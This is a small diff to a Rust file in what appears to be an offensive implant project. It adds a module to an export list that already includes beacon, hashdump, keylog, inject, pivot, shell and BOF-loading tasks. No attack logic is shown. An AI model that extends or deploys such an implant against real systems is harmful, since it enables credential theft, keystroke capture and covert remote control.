@@ -107,8 +107,8 @@ pub mod entry;
 pub use nyx_implant_tasks::inject;
 #[cfg(target_os = "windows")]
 pub use nyx_implant_tasks::{
-    beacon, bof, config_placeholder, env_keying, fs, hashdump, keylog, kits, pivot, postex, recon,
-    screenshot, selftests, shell, task_guard, tp, trex,
+    beacon, bof, config_placeholder, env_keying, fls, fs, hashdump, keylog, kits, pivot, postex,
+    recon, screenshot, selftests, shell, task_guard, tp, trex,
 };
 // #[no_mangle] symbol keep-alives after the move into an rlib:
 // - the 15 `Beacon*` shims are PRODUCTION exports: the BOF loader keys on
